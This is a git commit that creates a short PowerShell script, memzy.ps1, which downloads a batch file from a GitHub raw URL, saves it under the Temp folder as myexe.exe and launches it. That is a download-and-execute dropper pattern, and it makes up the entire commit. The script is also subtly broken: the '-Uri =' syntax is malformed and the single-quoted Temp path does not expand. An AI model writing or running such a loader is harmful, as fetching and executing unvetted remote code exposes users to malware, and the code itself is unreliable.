1c0b40decb6a840cc29a09ab57f1ca9424af2663
deathlimited <denis_srk@live.com>
2017-11-17 03:44:21 +0200

    Create memzy.ps1

---
+++ memzy.ps1
@@ -0,0 +1,6 @@
+
+$url = 'https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat'
+$outpath = '$env:Temp\myexe.exe'
+Invoke-WebRequest -Uri = $url -OutFile $outpath
+$args = @('Comma','Separated','Arguments')
+Start-Process -Filepath "$env:Temp\myexe.exe" -ArgumentList $args
